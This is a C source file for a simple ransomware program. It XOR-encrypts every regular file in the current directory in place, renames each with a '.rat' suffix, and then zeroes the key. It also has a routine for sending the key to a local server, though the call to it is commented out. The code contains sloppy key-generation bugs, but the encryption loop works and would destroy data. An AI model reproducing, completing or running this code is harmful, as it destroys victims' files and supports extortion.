#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h> 
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define PORT 1717

#define RANSOM_VERSION 1
#define MAGIC_LEN 1000
#define MAGIC_KEY 2

void encrypt_mem(char *buffer, size_t size, unsigned long key) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
    }
}

void decrypt_mem(char *buffer, size_t size, unsigned long key) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
    }
}

int valid_file(const char* file) {
    return strcmp(file, ".") && strcmp(file, "..") && strcmp(file, "ransom");
}

int send_key(unsigned long key){
    int sock = 0;
    struct sockaddr_in serv_addr;

    // Create socket file descriptor
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection Failed");
        exit(EXIT_FAILURE);
    }

    // Convert unsigned long to a byte array
    unsigned char buffer[sizeof(unsigned long)];
    for (int i = 0; i < sizeof(unsigned long); ++i) {
        buffer[i] = (key >> (i * 8)) & 0xFF;
    }

    // Send the byte array to the server
    send(sock, buffer, sizeof(unsigned long), 0);
    printf("Sent unsigned long value: %lu\n", key);

    close(sock);
}

void print_char_bits(char c) {
    for (int i = 7; i >= 0; i--) {
        printf("%d", (c & (1 << i)) ? 1 : 0);
    }
    printf(" magic\n");
}

unsigned long authorized_key(unsigned long key){
    char magic = (char)key;
    magic &= 0x0F;
    key = key << 1;
    key += 1;
    key = key << 4;
    key += magic;
    key = key << 1;    

    return key;
}

int validation_key(unsigned long key){
    char magic_1, magic_2;
    if(key % 2 != 0){
        printf("1\n");
        return 0;
    }

    key = key >> 1;
    magic_1 = (char)key;
    magic_1 &= 0x0F;

    key = key >> 4;

    if(key % 2 != 1){
        printf("2\n");
        return 0;
    }
    
    key = key >> 1;
    magic_2 = (char)key;
    magic_2 &= 0x0F;

    if(magic_1 != magic_2)  {
        printf("3\n");
        return 0;
    }
    return 1;
}
unsigned long generate_key(){
    unsigned long key;
    int i = 0;
    srand(time(NULL));  

    for(i = 0; i < sizeof(unsigned long); i += 2){
        key += rand();
        key << 2;
    }
    
    key = authorized_key(key);

    return key;
}


int main(void){
    {
        unsigned long key = generate_key();
        //send_key(key);
        DIR *d;
        struct dirent *dir;
        d = opendir(".");
        if (d) {
            while ((dir = readdir(d)) != NULL) {
                int fd;
                
                unsigned char buffer[1024];  // Buffer to store read data

                // Open file in read and write binary mode
                struct stat path_stat;
                if (stat(dir->d_name, &path_stat) != 0) {
                    perror("stat");
                    return 1;
                }

                if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
                    fd = open(dir->d_name, O_RDWR);

                    // Map the file into memory
                    char *file_contents = mmap(NULL, path_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
                    if (file_contents == MAP_FAILED) {
                        perror("Error mapping file to memory");
                        close(fd);
                        return 1;
                    }

                    // XOR the file contents with the key
                    encrypt_mem(file_contents, path_stat.st_size, key);
                    

                    if (munmap(file_contents, path_stat.st_size) == -1) {
                        perror("Error unmapping file from memory");
                        close(fd);
                        return 1;
                    }

                    // Close the file
                    close(fd);

                    const char* suffix = ".rat";
                    char new_name[256]; // Assuming maximum file name length is 255 characters

                    // Copy the old name to the new name buffer
                    strcpy(new_name, dir->d_name);

                    // Append the suffix to the new name
                    strcat(new_name, suffix);
                    // Unmap the file from memory
                    rename(dir->d_name, new_name);
                }
            } 
        }       
        key ^= key;
        
    }    


    return 0;
}